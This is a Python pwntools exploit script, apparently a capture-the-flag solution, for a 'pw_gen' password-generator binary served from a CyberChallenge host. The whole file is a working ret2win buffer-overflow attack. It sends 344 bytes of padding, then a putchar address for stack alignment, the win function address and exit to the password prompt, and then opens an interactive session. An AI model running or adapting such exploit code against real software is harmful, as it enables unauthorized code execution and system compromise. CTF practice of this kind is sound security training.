#!/usr/bin/env python3

from pwn import *

exe = ELF("./pw_gen")
context.binary = exe

PADDING = b'B' * 344


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("securepw.challs.cyberchallenge.it", 9216)

    return r
    
    
def ret2win():
    win_func = 0x4007a7
    exit = exe.plt['exit']
    dummy = exe.plt['putchar']

    # "putchar" so we can re-align the stack to 16 bytes for the XMM instruction inside system
    # NOTE: Locally any function would work but "puts" doesn't work on remote so i had to use "putchar"
    payload = PADDING + p64(dummy) + p64(win_func) + p64(exit)
    r.sendlineafter(b'password: ', payload)


def main():
    r = conn()

    # good luck pwning :)
    
    ret2win()
    r.interactive('> ')


if __name__ == "__main__":
    main()
